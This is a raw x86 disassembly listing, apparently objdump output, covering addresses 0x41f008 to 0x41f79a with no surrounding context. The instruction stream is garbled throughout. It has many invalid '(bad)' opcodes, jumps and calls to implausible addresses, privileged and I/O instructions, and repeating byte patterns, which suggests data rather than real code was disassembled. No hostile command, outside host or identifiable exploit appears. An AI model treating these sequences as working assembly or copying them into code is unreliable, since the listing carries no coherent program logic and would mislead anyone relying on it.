  41f008:	xor    eax,0xdb471e56
  41f00d:	bound  esi,QWORD PTR [ecx+ecx*2]
  41f010:	sbb    edx,edi
  41f012:	xchg   ebp,eax
  41f013:	push   ecx
  41f014:	bound  eax,QWORD PTR ds:0xd643f9bf
  41f01a:	inc    edi
  41f01b:	inc    esi
  41f01c:	inc    esp
  41f01d:	xchg   DWORD PTR [eax+eiz*1-0x4d8ee236],edi
  41f024:	pop    edx
  41f025:	dec    edx
  41f026:	add    esp,DWORD PTR [ebx+0x40]
  41f029:	jecxz  0x41efb1
  41f02b:	es xor eax,0x2adf653a
  41f031:	xchg   ebp,eax
  41f032:	mov    bl,0x5
  41f034:	push   0x43d069f8
  41f039:	dec    esi
  41f03a:	das    
  41f03b:	repz inc ebx
  41f03d:	add    BYTE PTR ds:0x41107840,al
  41f043:	bound  eax,QWORD PTR [eax+0x40]
  41f046:	sldt   WORD PTR [eax-0x34]
  41f04a:	js     0x41f0ae
  41f04c:	add    eax,0x40664143
  41f051:	inc    ebx
  41f052:	add    BYTE PTR [ecx+0x5],al
  41f055:	js     0x41f097
  41f057:	bound  eax,QWORD PTR [eax+0x0]
  41f05a:	inc    eax
  41f05b:	shl    BYTE PTR [esp+edi*1+0x63],1
  41f05f:	mov    ds:0xa80340c7,al
  41f064:	dec    ecx
  41f065:	arpl   WORD PTR [eax-0xe8f84a7],sp
  41f06b:	adc    ah,BYTE PTR [ebx-0x17]
  41f06e:	adc    eax,0x7d2747ab
  41f073:	inc    edx
  41f074:	jne    0x41f08e
  41f076:	leave  
  41f077:	mov    esp,0x1b7456e
  41f07c:	(bad)  
  41f07d:	rcr    DWORD PTR [ebp+eax*1+0x1445907b],1
  41f084:	dec    edi
  41f085:	inc    ecx
  41f086:	inc    ebx
  41f087:	inc    eax
  41f088:	inc    eax
  41f089:	add    eax,0x434162
  41f08e:	inc    eax
  41f08f:	add    BYTE PTR [edx+0x5],ah
  41f092:	inc    eax
  41f093:	adc    BYTE PTR [edx+0x40],ah
  41f096:	inc    ebx
  41f097:	inc    ecx
  41f098:	add    eax,0x4340
  41f09d:	add    eax,0x404162
  41f0a2:	add    BYTE PTR [eax+0x43],al
  41f0a5:	inc    eax
  41f0a6:	add    eax,0xaac90563
  41f0ab:	xor    al,0xf1
  41f0ad:	int    0x40
  41f0af:	jl     0x41f07a
  41f0b1:	pop    eax
  41f0b2:	xor    dh,BYTE PTR [eax]
  41f0b4:	pop    esi
  41f0b5:	dec    eax
  41f0b6:	mov    al,ds:0x8b43d940
  41f0bb:	jae    0x41f050
  41f0bd:	or     eax,0x4350623d
  41f0c2:	jb     0x41f08e
  41f0c4:	lahf   
  41f0c5:	inc    edi
  41f0c6:	ret    
  41f0c7:	inc    eax
  41f0c8:	add    BYTE PTR [eax],al
  41f0ca:	inc    ecx
  41f0cb:	inc    ebx
  41f0cc:	add    eax,0x41784062
  41f0d1:	inc    eax
  41f0d2:	inc    eax
  41f0d3:	add    BYTE PTR [edi],cl
  41f0d5:	bound  eax,QWORD PTR [ebx+0x0]
  41f0d8:	add    eax,0x25006240
  41f0dd:	inc    eax
  41f0de:	add    eax,0x40254143
  41f0e3:	add    eax,0x7f620000
  41f0e8:	mov    al,ds:0x7a770630
  41f0ed:	das    
  41f0ee:	mov    al,ds:0xa8318177
  41f0f3:	inc    edx
  41f0f4:	mov    cl,0x50
  41f0f6:	add    eax,0x5a764055
  41f0fb:	aad    0xfb
  41f0fd:	(bad)  
  41f0fe:	leave  
  41f0ff:	arpl   di,si
  41f101:	test   al,0xa9
  41f103:	inc    edx
  41f104:	push   ebx
  41f105:	pop    eax
  41f106:	inc    esp
  41f107:	pop    esp
  41f108:	dec    edi
  41f109:	cdq    
  41f10a:	call   0x487643ee
  41f10f:	cld    
  41f110:	mov    al,0x27
  41f112:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f113:	out    dx,eax
  41f114:	sar    DWORD PTR [eax+0x11057563],1
  41f11a:	cmp    ebx,DWORD PTR [edx+0x4d]
  41f11d:	add    eax,0xe0cb6438
  41f122:	test   DWORD PTR [ebx+0x0],eax
  41f125:	add    BYTE PTR [eax],al
  41f127:	inc    ecx
  41f128:	inc    eax
  41f129:	bound  esp,QWORD PTR [esi+0x0]
  41f12c:	inc    eax
  41f12d:	add    eax,0x5400000
  41f132:	inc    ecx
  41f133:	inc    eax
  41f134:	inc    eax
  41f135:	bound  esp,QWORD PTR ds:0x25050043
  41f13b:	inc    ecx
  41f13c:	inc    ebx
  41f13d:	inc    eax
  41f13e:	test   BYTE PTR [eax+0x0],al
  41f141:	bound  ebx,QWORD PTR [eax+0x62]
  41f144:	inc    ecx
  41f145:	inc    eax
  41f146:	(bad)  
  41f147:	push   ebx
  41f148:	jns    0x41f175
  41f14a:	cld    
  41f14b:	dec    ebp
  41f14c:	or     eax,0x4249145e
  41f151:	jp     0x41f1b9
  41f153:	inc    esi
  41f154:	int    0x1a
  41f156:	inc    esi
  41f157:	std    
  41f158:	inc    ebp
  41f159:	test   al,0x44
  41f15b:	test   al,0x10
  41f15d:	mov    edx,DWORD PTR [edx+0x7c10f872]
  41f163:	addr16 push esp
  41f165:	bound  edi,QWORD PTR [edi-0x3]
  41f168:	call   0x5926355
  41f16d:	pop    es
  41f16e:	inc    eax
  41f16f:	dec    esp
  41f170:	adc    eax,DWORD PTR ds:0x7fcbf82a
  41f176:	pusha  
  41f177:	xor    eax,ecx
  41f179:	retf   
  41f17a:	pop    esp
  41f17b:	imul   edx,DWORD PTR [edx],0x41406210
  41f181:	and    eax,0x40000500
  41f186:	inc    ebx
  41f187:	add    eax,0x40624041
  41f18c:	inc    ebx
  41f18d:	add    eax,0x43402541
  41f192:	bound  eax,QWORD PTR [eax+0x43]
  41f195:	int3   
  41f196:	inc    eax
  41f197:	bound  eax,QWORD PTR [eax]
  41f199:	inc    ecx
  41f19a:	inc    eax
  41f19b:	inc    eax
  41f19c:	add    eax,0x275be205
  41f1a1:	arpl   ax,bp
  41f1a3:	push   edx
  41f1a4:	arpl   WORD PTR [eax-0x2f],bx
  41f1a7:	je     0x41f204
  41f1a9:	imul   edx,DWORD PTR ds:0x6a155042,0xc935bf29
  41f1b3:	lods   al,BYTE PTR ds:[esi]
  41f1b4:	or     eax,0x34e2a2cb
  41f1b9:	outs   dx,BYTE PTR ds:[esi]
  41f1ba:	mov    ds:0x6115015,al
  41f1bf:	cmp    eax,0x5291b93b
  41f1c4:	xor    al,BYTE PTR [edx+0x3a]
  41f1c7:	sar    DWORD PTR [eax-0x3d],1
  41f1ca:	nop
  41f1cb:	push   es
  41f1cc:	mov    al,ds:0x9f41a140
  41f1d1:	bound  eax,QWORD PTR [eax+0x25]
  41f1d4:	add    BYTE PTR [esi+0x40],ah
  41f1d7:	add    eax,0x40404143
  41f1dc:	inc    ebx
  41f1dd:	add    BYTE PTR [eax],al
  41f1df:	add    BYTE PTR [edx-0x34],ah
  41f1e2:	inc    eax
  41f1e3:	add    eax,0x40004041
  41f1e8:	inc    ecx
  41f1e9:	int3   
  41f1ea:	add    BYTE PTR [ebx-0x7c],al
  41f1ed:	add    eax,0x5406240
  41f1f2:	bound  edx,QWORD PTR [eax]
  41f1f4:	adc    eax,0x410cc528
  41f1f9:	adc    BYTE PTR [esp+ecx*2],dh
  41f1fc:	retf   
  41f1fd:	bound  ecx,QWORD PTR [edi-0x33]
  41f200:	mov    dl,0x26
  41f202:	xchg   ebp,eax
  41f203:	not    DWORD PTR [eax+0x284e4b42]
  41f209:	pop    eax
  41f20a:	inc    eax
  41f20b:	dec    edi
  41f20c:	inc    eax
  41f20d:	bound  ebx,QWORD PTR [eax+0x41]
  41f210:	add    eax,0x40404340
  41f215:	inc    ebx
  41f216:	inc    eax
  41f217:	test   BYTE PTR [eax],al
  41f219:	add    eax,0x40624041
  41f21e:	inc    eax
  41f21f:	add    BYTE PTR [edx+0x5],ah
  41f222:	inc    ebx
  41f223:	add    BYTE PTR [eax+0x78],al
  41f226:	inc    ecx
  41f227:	add    BYTE PTR [eax+0x41],bl
  41f22a:	bound  ecx,QWORD PTR ds:0x96c4b844
  41f230:	xor    DWORD PTR [edi+0x48],edx
  41f233:	leave  
  41f234:	jge    0x41f1f9
  41f236:	shl    BYTE PTR [ecx],1
  41f238:	pop    eax
  41f239:	push   ebx
  41f23a:	add    eax,0x3643674b
  41f23f:	ja     0x41f214
  41f241:	jg     0x41f20e
  41f243:	test   eax,0x6bc34540
  41f248:	inc    eax
  41f249:	pop    ebp
  41f24a:	mov    eax,0xa8e0d4c3
  41f24f:	aas    
  41f250:	xchg   edx,eax
  41f251:	fist   DWORD PTR ds:0x10406844
  41f257:	pop    edx
  41f258:	inc    eax
  41f259:	test   BYTE PTR [eax],al
  41f25b:	int3   
  41f25c:	bound  eax,QWORD PTR ds:0xcc840f41
  41f262:	inc    ebx
  41f263:	add    BYTE PTR [eax+0x0],al
  41f266:	inc    eax
  41f267:	inc    eax
  41f268:	inc    eax
  41f269:	int3   
  41f26a:	add    BYTE PTR ds:0x62404341,al
  41f270:	pop    eax
  41f271:	add    BYTE PTR [ebx+0x40],al
  41f274:	bound  ecx,QWORD PTR [edi]
  41f276:	inc    eax
  41f277:	test   eax,0x4408cb46
  41f27c:	mov    cl,0x58
  41f27e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f27f:	sbb    BYTE PTR [ebx],dl
  41f281:	jp     0x41f24e
  41f283:	jl     0x41f22e
  41f285:	add    eax,0x34d99392
  41f28a:	dec    esp
  41f28b:	jp     0x41f2d2
  41f28d:	retf   
  41f28e:	add    BYTE PTR [ebp-0x5ab8b18f],bl
  41f294:	xor    eax,0xbf70a641
  41f299:	aas    
  41f29a:	inc    eax
  41f29b:	cmp    BYTE PTR [edi+0x2a],al
  41f29e:	pop    ebx
  41f29f:	shr    DWORD PTR [esi],1
  41f2a1:	hlt    
  41f2a2:	bound  ecx,QWORD PTR [edi+0x43]
  41f2a5:	jo     0x41f24c
  41f2a7:	and    DWORD PTR [ecx],esi
  41f2a9:	bound  esp,QWORD PTR [esp+esi*4+0x6b]
  41f2ad:	inc    edi
  41f2ae:	icebp  
  41f2af:	push   ebp
  41f2b0:	jbe    0x41f26a
  41f2b2:	add    BYTE PTR [eax],al
  41f2b4:	inc    eax
  41f2b5:	inc    eax
  41f2b6:	cmovno eax,DWORD PTR ds:0x40056243
  41f2bd:	int3   
  41f2be:	add    ah,cl
  41f2c0:	inc    eax
  41f2c1:	inc    eax
  41f2c2:	bound  eax,QWORD PTR [ecx+0x0]
  41f2c5:	add    BYTE PTR [edi],cl
  41f2c7:	inc    ebx
  41f2c8:	inc    eax
  41f2c9:	inc    eax
  41f2ca:	add    BYTE PTR [ecx+0x43],al
  41f2cd:	add    eax,0x40256240
  41f2d2:	bound  eax,QWORD PTR [eax]
  41f2d4:	arpl   WORD PTR [ebp+0x3533af0],sp
  41f2da:	pop    ss
  41f2db:	or     eax,0xcca53a33
  41f2e0:	jecxz  0x41f2d7
  41f2e2:	test   ecx,ecx
  41f2e4:	push   ebx
  41f2e5:	inc    esp
  41f2e6:	and    al,0x11
  41f2e8:	sbb    eax,0x39413152
  41f2ed:	jl     0x41f298
  41f2ef:	xor    eax,0xa96c9186
  41f2f4:	xchg   edx,eax
  41f2f5:	inc    esp
  41f2f6:	inc    ebp
  41f2f7:	inc    ecx
  41f2f8:	inc    ebp
  41f2f9:	retf   
  41f2fa:	adc    al,bl
  41f2fc:	scas   al,BYTE PTR es:[edi]
  41f2fd:	pusha  
  41f2fe:	xor    eax,0x35514a4c
  41f303:	mov    eax,0x3d46f73d
  41f308:	pop    ebp
  41f309:	pop    ds
  41f30a:	inc    ecx
  41f30b:	inc    esp
  41f30c:	add    BYTE PTR [ecx+0x41],ah
  41f30f:	ret    
  41f310:	lods   eax,DWORD PTR ds:[esi]
  41f311:	add    eax,0x4140cc00
  41f316:	inc    eax
  41f317:	inc    ebx
  41f318:	bound  esp,QWORD PTR ds:0x41400043
  41f31e:	add    BYTE PTR [eax],al
  41f320:	add    eax,0x43624062
  41f325:	inc    ecx
  41f326:	inc    eax
  41f327:	inc    eax
  41f328:	inc    eax
  41f329:	add    eax,0x40624340
  41f32e:	add    eax,0x40664140
  41f333:	hlt    
  41f334:	mov    cl,0x89
  41f336:	sar    BYTE PTR ds:0x670bde65,1
  41f33c:	inc    eax
  41f33d:	hlt    
  41f33e:	dec    ecx
  41f33f:	push   ecx
  41f340:	call   0xf0944c89
  41f345:	bound  esi,QWORD PTR [esi]
  41f347:	idiv   DWORD PTR [ebx+eax*8]
  41f34a:	(bad)  
  41f34c:	pusha  
  41f34d:	jmp    0x5cea54b9
  41f352:	xchg   BYTE PTR [ebp-0x4157e74a],bh
  41f358:	bound  esp,QWORD PTR [ebx-0x1]
  41f35b:	adc    DWORD PTR [ebx],ebx
  41f35d:	bound  edx,QWORD PTR [ecx]
  41f35f:	mov    ds:0xbe0bdca9,eax
  41f364:	fistp  QWORD PTR ds:0x13542c48
  41f36a:	add    BYTE PTR [edi+0x4441cc6f],bh
  41f370:	inc    ebx
  41f371:	add    BYTE PTR ds:0x41107840,al
  41f377:	bound  eax,QWORD PTR [eax+0x40]
  41f37a:	sldt   WORD PTR [eax-0x34]
  41f37e:	js     0x41f3e2
  41f380:	add    eax,0x40664143
  41f385:	inc    ebx
  41f386:	add    BYTE PTR [ecx+0x5],al
  41f389:	js     0x41f3cb
  41f38b:	bound  eax,QWORD PTR [eax+0x0]
  41f38e:	inc    eax
  41f38f:	push   ecx
  41f390:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f391:	rol    DWORD PTR [eax+0x51],1
  41f394:	xchg   edi,eax
  41f395:	in     eax,dx
  41f396:	jl     0x41f3ea
  41f398:	fisubr DWORD PTR [ebx]
  41f39a:	inc    eax
  41f39b:	lds    edi,FWORD PTR [esp+esi*4]
  41f39e:	imul   edi,DWORD PTR [ebp+eax*1+0x1d135046],0x71059a62
  41f3a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f3aa:	sbb    BYTE PTR [ebx],0x63
  41f3ad:	mov    dh,0x34
  41f3af:	arpl   dx,sp
  41f3b1:	mov    cl,BYTE PTR [edi]
  41f3b3:	xchg   ebx,eax
  41f3b4:	or     DWORD PTR [ecx+0x43],eax
  41f3b7:	inc    eax
  41f3b8:	inc    eax
  41f3b9:	add    eax,0x434162
  41f3be:	inc    eax
  41f3bf:	add    BYTE PTR [edx+0x5],ah
  41f3c2:	inc    eax
  41f3c3:	adc    BYTE PTR [edx+0x40],ah
  41f3c6:	inc    ebx
  41f3c7:	inc    ecx
  41f3c8:	add    eax,0x4340
  41f3cd:	add    eax,0x404162
  41f3d2:	add    BYTE PTR [eax+0x43],al
  41f3d5:	inc    eax
  41f3d6:	add    eax,0xf83644c4
  41f3db:	stos   BYTE PTR es:[edi],al
  41f3dc:	inc    eax
  41f3dd:	dec    ebx
  41f3de:	dec    eax
  41f3df:	hlt    
  41f3e0:	jl     0x41f423
  41f3e2:	fsub   st,st(4)
  41f3e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f3e5:	adc    DWORD PTR [ebx+0x15],esp
  41f3e8:	jne    0x41f444
  41f3ea:	inc    esi
  41f3eb:	loope  0x41f3cd
  41f3ed:	pop    ecx
  41f3ee:	sub    eax,0xb6a996cd
  41f3f3:	inc    esi
  41f3f4:	push   ecx
  41f3f5:	jno    0x41f44f
  41f3f7:	popa   
  41f3f8:	jo     0x41f44b
  41f3fa:	(bad)  
  41f3fb:	stc    
  41f3fc:	inc    eax
  41f3fd:	inc    esi
  41f3fe:	arpl   WORD PTR [edi],sp
  41f400:	push   edx
  41f401:	inc    ecx
  41f402:	adc    ebx,DWORD PTR [edi-0xbd58e82]
  41f408:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f409:	test   al,0xe5
  41f40b:	das    
  41f40c:	and    al,0x61
  41f40e:	test   eax,0xf10f805
  41f413:	fadd   DWORD PTR [eax+0x0]
  41f416:	add    BYTE PTR [ecx+0x43],al
  41f419:	add    eax,0x41784062
  41f41e:	inc    eax
  41f41f:	inc    eax
  41f420:	add    BYTE PTR [edi],cl
  41f422:	bound  eax,QWORD PTR [ebx+0x0]
  41f425:	add    eax,0x25006240
  41f42a:	inc    eax
  41f42b:	add    eax,0x40254143
  41f430:	add    eax,0x75620000
  41f435:	jne    0x41f3b7
  41f437:	xchg   DWORD PTR [ebx+eiz*2-0x7],eax
  41f43b:	ja     0x41f47e
  41f43d:	mov    edi,0x267c8c73
  41f442:	aam    0x48
  41f444:	pop    eax
  41f445:	xor    al,0x47
  41f447:	xchg   ebx,eax
  41f448:	ins    BYTE PTR es:[edi],dx
  41f449:	mov    al,0x5
  41f44b:	jl     0x41f486
  41f44d:	mov    ch,0x42
  41f44f:	mov    WORD PTR [ecx+0x41],es
  41f452:	inc    ecx
  41f453:	cmovbe esi,DWORD PTR [eax+0x15]
  41f457:	or     eax,0xf4ebab8
  41f45c:	push   ebp
  41f45d:	adc    ah,al
  41f45f:	leave  
  41f460:	mov    al,ds:0x5193846c
  41f465:	xor    ch,BYTE PTR [ecx-0x10]
  41f468:	popa   
  41f469:	push   ecx
  41f46a:	shl    BYTE PTR [edi],cl
  41f46c:	addr16 xor al,0x4c
  41f46f:	or     eax,0x43bd
  41f474:	add    BYTE PTR [ecx+0x40],al
  41f477:	bound  esp,QWORD PTR [esi+0x0]
  41f47a:	inc    eax
  41f47b:	add    eax,0x5400000
  41f480:	inc    ecx
  41f481:	inc    eax
  41f482:	inc    eax
  41f483:	bound  esp,QWORD PTR ds:0x25050043
  41f489:	inc    ecx
  41f48a:	inc    ebx
  41f48b:	inc    eax
  41f48c:	test   BYTE PTR [eax+0x0],al
  41f48f:	bound  ebx,QWORD PTR [eax+0x62]
  41f492:	inc    ecx
  41f493:	inc    eax
  41f494:	call   DWORD PTR ds:0xac31d3fc
  41f49a:	retf   
  41f49b:	inc    esp
  41f49c:	dec    edi
  41f49d:	push   ebx
  41f49e:	lock inc esp
  41f4a0:	imul   eax,ebx,0xe2b0d5f0
  41f4a6:	cmc    
  41f4a7:	adc    eax,0x990506f1
  41f4ac:	or     eax,0x5d3870fa
  41f4b1:	dec    ecx
  41f4b3:	arpl   bx,cx
  41f4b5:	rcr    BYTE PTR [ebx+edx*4-0xd],1
  41f4b9:	imul   edx,DWORD PTR [eax-0x51],0x198f0d61
  41f4c0:	pop    edx
  41f4c1:	or     BYTE PTR ds:0x10e03544,al
  41f4c7:	bound  eax,QWORD PTR [eax+0x41]
  41f4ca:	and    eax,0x40000500
  41f4cf:	inc    ebx
  41f4d0:	add    eax,0x40624041
  41f4d5:	inc    ebx
  41f4d6:	add    eax,0x43402541
  41f4db:	bound  eax,QWORD PTR [eax+0x43]
  41f4de:	int3   
  41f4df:	inc    eax
  41f4e0:	bound  eax,QWORD PTR [eax]
  41f4e2:	inc    ecx
  41f4e3:	inc    eax
  41f4e4:	inc    eax
  41f4e5:	add    eax,0x51313a05
  41f4ea:	fmul   st(3),st
  41f4ec:	jge    0x41f530
  41f4ee:	jecxz  0x41f47c
  41f4f0:	inc    ecx
  41f4f1:	pop    edx
  41f4f2:	arpl   WORD PTR [esi+0x47],ax
  41f4f5:	inc    esi
  41f4f6:	stc    
  41f4f7:	cmp    BYTE PTR [ebp-0xc],dh
  41f4fa:	add    eax,0xce6160ab
  41f4ff:	inc    edx
  41f500:	inc    ecx
  41f501:	lahf   
  41f502:	int3   
  41f503:	lock or eax,edi
  41f506:	sbb    DWORD PTR [edi+edi*2+0x32],esi
  41f50a:	arpl   WORD PTR ds:0x8bbe02dc,dx
  41f510:	add    DWORD PTR [eax-0x35],esp
  41f513:	leave  
  41f514:	jle    0x41f4ba
  41f516:	int3   
  41f517:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f518:	lahf   
  41f519:	rol    DWORD PTR [eax-0x64],1
  41f51c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f51d:	push   edx
  41f51e:	jnp    0x41f582
  41f520:	inc    eax
  41f521:	and    eax,0x5406600
  41f526:	inc    ebx
  41f527:	inc    ecx
  41f528:	inc    eax
  41f529:	inc    eax
  41f52a:	inc    ebx
  41f52b:	add    BYTE PTR [eax],al
  41f52d:	add    BYTE PTR [edx-0x34],ah
  41f530:	inc    eax
  41f531:	add    eax,0x40004041
  41f536:	inc    ecx
  41f537:	int3   
  41f538:	add    BYTE PTR [ebx-0x7c],al
  41f53b:	add    eax,0x5406240
  41f540:	bound  edi,QWORD PTR ds:0x150958bf
  41f546:	(bad)  
  41f547:	test   eax,0x55517eb1
  41f54c:	imul   ecx,ebx,0x76ca43d4
  41f552:	mov    edi,0x5a483417
  41f557:	ror    DWORD PTR ds:0x701351c4,0x33
  41f55e:	test   eax,0xbfef6215
  41f563:	push   esi
  41f564:	mov    cl,0x50
  41f566:	jmp    0x41f533
  41f568:	cmp    ch,0x40
  41f56b:	bound  ebx,QWORD PTR [eax+0x41]
  41f56e:	add    eax,0x40404340
  41f573:	inc    ebx
  41f574:	inc    eax
  41f575:	test   BYTE PTR [eax],al
  41f577:	add    eax,0x40624041
  41f57c:	inc    eax
  41f57d:	add    BYTE PTR [edx+0x5],ah
  41f580:	inc    ebx
  41f581:	add    BYTE PTR [eax+0x78],al
  41f584:	inc    ecx
  41f585:	add    BYTE PTR [eax+0x41],bl
  41f588:	bound  edx,QWORD PTR [edx+0x31]
  41f58b:	arpl   WORD PTR ds:0xabc800ab,cx
  41f591:	xor    BYTE PTR [ebp-0x3],dl
  41f594:	jnp    0x41f54a
  41f596:	mov    DWORD PTR [esi],edi
  41f598:	mov    bl,0x4
  41f59a:	xchg   ebp,eax
  41f59b:	ret    
  41f59c:	pushf  
  41f59d:	inc    ecx
  41f59e:	ret    
  41f59f:	(bad)  
  41f5a0:	call   0x48874de5
  41f5a5:	cmp    DWORD PTR [edx+0x66],eax
  41f5a8:	int    0xf
  41f5aa:	xchg   ebx,eax
  41f5ab:	cmp    al,BYTE PTR [eax-0x68]
  41f5ae:	inc    ebx
  41f5af:	(bad)  
  41f5b0:	cmp    eax,0x3e056652
  41f5b5:	arpl   WORD PTR [ecx+ebx*1+0x58937043],cx
  41f5bc:	xor    BYTE PTR [edi],bl
  41f5be:	push   ecx
  41f5bf:	mov    ebp,0x84406577
  41f5c4:	add    ah,cl
  41f5c6:	bound  eax,QWORD PTR ds:0xcc840f41
  41f5cc:	inc    ebx
  41f5cd:	add    BYTE PTR [eax+0x0],al
  41f5d0:	inc    eax
  41f5d1:	inc    eax
  41f5d2:	inc    eax
  41f5d3:	int3   
  41f5d4:	add    BYTE PTR ds:0x62404341,al
  41f5da:	pop    eax
  41f5db:	add    BYTE PTR [ebx+0x40],al
  41f5de:	bound  ecx,QWORD PTR [edi]
  41f5e0:	inc    eax
  41f5e1:	aas    
  41f5e2:	fs inc edx
  41f5e4:	xor    al,0xe
  41f5e6:	(bad)
  41f5ea:	dec    edx
  41f5eb:	mov    WORD PTR [esi-0x47],gs
  41f5ee:	or     eax,0xa746b64
  41f5f3:	pop    ss
  41f5f4:	cmp    al,0x63
  41f5f6:	dec    eax
  41f5f7:	mov    ch,0xd8
  41f5f9:	and    ebp,DWORD PTR [ecx-0x79a89d02]
  41f5ff:	pop    ecx
  41f600:	imul   ecx,DWORD PTR [eax+0x62],0x51
  41f604:	and    DWORD PTR [ebx-0x6e20fe3e],ebp
  41f60a:	inc    ecx
  41f60b:	les    esi,FWORD PTR [esi+edi*4]
  41f60e:	add    eax,0xf44252e7
  41f613:	rcl    BYTE PTR [edx+0x0],0x0
  41f617:	inc    eax
  41f618:	inc    eax
  41f619:	cmovno eax,DWORD PTR ds:0x40056243
  41f620:	int3   
  41f621:	add    ah,cl
  41f623:	inc    eax
  41f624:	inc    eax
  41f625:	bound  eax,QWORD PTR [ecx+0x0]
  41f628:	add    BYTE PTR [edi],cl
  41f62a:	inc    ebx
  41f62b:	inc    eax
  41f62c:	inc    eax
  41f62d:	add    BYTE PTR [ecx+0x43],al
  41f630:	add    eax,0x40256240
  41f635:	bound  eax,QWORD PTR [eax]
  41f637:	or     ch,BYTE PTR [ecx+0x3a]
  41f63a:	lahf   
  41f63b:	rcl    BYTE PTR [ebx+0x45],1
  41f63e:	push   esp
  41f63f:	leave  
  41f640:	repnz ficom WORD PTR [edx+0x5]
  41f644:	xlat   BYTE PTR ds:[ebx]
  41f645:	and    DWORD PTR [ebx-0x604f07da],ebp
  41f64b:	inc    eax
  41f64c:	test   al,0x35
  41f64e:	add    eax,0x4140cc00
  41f653:	inc    eax
  41f654:	inc    ebx
  41f655:	bound  esp,QWORD PTR ds:0x41400043
  41f65b:	add    BYTE PTR [eax],al
  41f65d:	add    eax,0x43624062
  41f662:	inc    ecx
  41f663:	inc    eax
  41f664:	inc    eax
  41f665:	inc    eax
  41f666:	add    eax,0x40624340
  41f66b:	add    eax,0x40664140
  41f670:	inc    edx
  41f671:	push   eax
  41f672:	shl    BYTE PTR [eax-0x57eeacae],0x34
  41f679:	inc    esp
  41f67a:	aam    0x57
  41f67c:	lahf   
  41f67d:	outs   dx,DWORD PTR ds:[esi]
  41f67e:	fst    DWORD PTR [edx]
  41f680:	inc    ecx
  41f681:	xor    BYTE PTR [edx-0x4ce0ad55],bh
  41f687:	mov    ah,0x40
  41f689:	aam    0xc4
  41f68b:	stos   BYTE PTR es:[edi],al
  41f68c:	lahf   
  41f68d:	outs   dx,DWORD PTR ds:[esi]
  41f68e:	bound  eax,QWORD PTR [ecx-0x2c]
  41f691:	rcl    al,0x8d
  41f694:	inc    ebx
  41f695:	add    BYTE PTR ds:0x41107840,al
  41f69b:	bound  eax,QWORD PTR [eax+0x40]
  41f69e:	sldt   WORD PTR [eax-0x34]
  41f6a2:	js     0x41f706
  41f6a4:	add    eax,0x40664143
  41f6a9:	inc    ebx
  41f6aa:	add    BYTE PTR [ecx+0x5],al
  41f6ad:	js     0x41f6ef
  41f6af:	bound  eax,QWORD PTR [eax+0x0]
  41f6b2:	inc    eax
  41f6b3:	xor    al,0x1f
  41f6b5:	int    0x8b
  41f6b7:	ins    BYTE PTR es:[edi],dx
  41f6b8:	mov    DWORD PTR [edx-0x2],esp
  41f6bb:	push   esp
  41f6bc:	test   ebx,0x6cc16ee8
  41f6c2:	jge    0x41f6f5
  41f6c4:	outs   dx,DWORD PTR ds:[esi]
  41f6c5:	adc    bl,cl
  41f6c7:	(bad)  
  41f6c8:	mov    esi,0x1fbdb49c
  41f6cd:	push   ebp
  41f6ce:	cmp    BYTE PTR [ecx+0x8],bl
  41f6d1:	stc    
  41f6d2:	(bad)  
  41f6d3:	jae    0x41f744
  41f6d5:	cmp    eax,DWORD PTR [ebp+0x63]
  41f6d8:	test   esp,0xc51f7056
  41f6de:	lock mov BYTE PTR [edi-0x2f],cl
  41f6e2:	shl    BYTE PTR ds:0x7044cd48,0x50
  41f6e9:	(bad)  
  41f6ea:	in     eax,0x16
  41f6ec:	aas    
  41f6ed:	adc    al,BYTE PTR [ecx+0x43]
  41f6f0:	inc    eax
  41f6f1:	inc    eax
  41f6f2:	add    eax,0x434162
  41f6f7:	inc    eax
  41f6f8:	add    BYTE PTR [edx+0x5],ah
  41f6fb:	inc    eax
  41f6fc:	adc    BYTE PTR [edx+0x40],ah
  41f6ff:	inc    ebx
  41f700:	inc    ecx
  41f701:	add    eax,0x4340
  41f706:	add    eax,0x404162
  41f70b:	add    BYTE PTR [eax+0x43],al
  41f70e:	inc    eax
  41f70f:	add    eax,0xc50562c4
  41f714:	sbb    eax,0x4f414893
  41f719:	cmc    
  41f71a:	retf   
  41f71b:	or     ebx,DWORD PTR [edx-0xe]
  41f71e:	mov    edi,0x5628bf37
  41f723:	xchg   ebp,eax
  41f724:	repz inc eax
  41f726:	add    BYTE PTR [eax],al
  41f728:	inc    ecx
  41f729:	inc    ebx
  41f72a:	add    eax,0x41784062
  41f72f:	inc    eax
  41f730:	inc    eax
  41f731:	add    BYTE PTR [edi],cl
  41f733:	bound  eax,QWORD PTR [ebx+0x0]
  41f736:	add    eax,0x25006240
  41f73b:	inc    eax
  41f73c:	add    eax,0x40254143
  41f741:	add    eax,0x91620000
  41f746:	outs   dx,DWORD PTR ds:[esi]
  41f747:	aad    0x41
  41f749:	mov    eax,ds:0x29bc435
  41f74e:	pop    ds
  41f74f:	int    0xed
  41f751:	rol    BYTE PTR [ecx-0x30],1
  41f754:	adc    eax,0xec442791
  41f759:	lods   al,BYTE PTR ds:[esi]
  41f75a:	lods   al,BYTE PTR ds:[esi]
  41f75b:	bound  eax,QWORD PTR [eax+0x51]
  41f75e:	pop    ecx
  41f75f:	sub    dl,BYTE PTR [edx-0x222ac2fb]
  41f765:	jne    0x41f7b9
  41f767:	inc    esp
  41f768:	pop    eax
  41f769:	retf   
  41f76a:	ret    
  41f76b:	jp     0x41f708
  41f76d:	inc    ecx
  41f76e:	jae    0x41f79a
  41f770:	lds    ecx,FWORD PTR [ecx-0x54]
  41f773:	(bad)  
  41f774:	fstp   QWORD PTR [ecx+0x54]
  41f777:	inc    ebx
  41f778:	shl    BYTE PTR ds:0x43c40d,1
  41f77e:	add    BYTE PTR [eax],al
  41f780:	inc    ecx
  41f781:	inc    eax
  41f782:	bound  esp,QWORD PTR [esi+0x0]
  41f785:	inc    eax
  41f786:	add    eax,0x5400000
  41f78b:	inc    ecx
  41f78c:	inc    eax
  41f78d:	inc    eax
  41f78e:	bound  esp,QWORD PTR ds:0x25050043
  41f794:	inc    ecx
  41f795:	inc    ebx
  41f796:	inc    eax
  41f797:	test   BYTE PTR [eax+0x0],al
  41f79a:	bound  ebx,QWORD PTR [eax+0x62]
